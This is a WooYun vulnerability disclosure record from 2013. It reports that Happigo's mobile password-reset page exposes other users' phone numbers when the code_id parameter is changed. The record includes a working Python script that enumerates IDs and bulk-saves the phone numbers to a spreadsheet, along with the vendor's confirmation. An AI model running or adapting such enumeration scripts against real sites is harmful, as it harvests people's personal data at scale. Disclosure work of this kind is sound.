{"id": 10601, "wybug_id": "wooyun-2013-027593", "wybug_title": "快乐购大量用户敏感信息泄露，可批量获取用户手机号", "wybug_corp": "快乐购物股份有限公司", "wybug_author": "xfkxfk", "wybug_date": "2013-07-03 15:07", "wybug_open_date": "2013-08-17 15:08", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄漏", "敏感信息泄露", "用户敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-08-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-17：\t细节向公众公开  简要描述： 快乐购大量用户敏感信息泄露，可批量获取 详细说明：  一、在忘记密码功能点，权限控制不严，存在大量用户敏感信息泄露\nurl：m.happigo.com/user/login.php\n第一步进入登陆页面，点击忘记密码：\n\n第二步输入用户名，手机号码，用于发送验证码\n\n第三步要输入验证码，这里我们就不管了，现在看看url地址：\nhttp://m.happigo.com/user/checkcode.php?code_id=16059\n这个code_id就是存在问题，这里我是第16060位重置自己密码的用户，这里把用户的手机号码显示出来了，那么我们试试更改一下这个code_id，看能不能看到其他用户的手机号码。我们把code_id改为16059，如下图，果然可以看到其他用户的手机号码，上一个脚本爬出所有重置过密码的用户的手机号码，大量信息啊！！！\n\n下面给出脚本批量获取到的用户信息。============================================================================\n#-*- coding:utf-8-*-import urllib2from tempfile import TemporaryFilefrom xlwt import Workbookimport revulinfo_list = []code_id_list = []def req_url(code_id):    url = \"http://m.happigo.com/user/checkcode.php?code_id=%d\" % code_id    req = urllib2.Request(url)    req.add_header( \"Connection\",\"keep-alive\" )     res = urllib2.urlopen( req )    html = res.read()    return html,code_iddef match_info(html,code_id):    if re.search(r'\\d{11}',html):        phonenumber = re.search(r'\\d{11}',html).group()        print \"[%s]手机号码：\" % code_id,phonenumber        vulinfo_list.append(int(phonenumber))        code_id_list.append(int(code_id))        def thread_run(sheet1):    for code_id in range(16060):        html,code_id = req_url(code_id)        match_info(html,code_id)        if len(code_id_list) == len(vulinfo_list):            for i in range(len(vulinfo_list)):            #for j in range(0,2):            sheet1.write(i,0,code_id_list[i])            sheet1.write(i,1,vulinfo_list[i])def run():    book = Workbook()    sheet1 = book.add_sheet('Sheet 1')    thread_run(sheet1)        book.save('happigo_user_phonenumber.xls')    book.save(TemporaryFile())if __name__ == \"__main__\":run()\n============================================================================结果：\n\n由于这是很早前的截取的信息，截止目前已经差不多到1w用户手机号码了。二、声明没有泄露任何截获到的用户信息，及进行非法操作。   漏洞证明：  见详细说明   修复方案：  1、隐藏并控制好用户敏感信息   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2013-07-03 15:51 厂商回复： 感谢xfkxfk对漏洞的提交，我们将尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}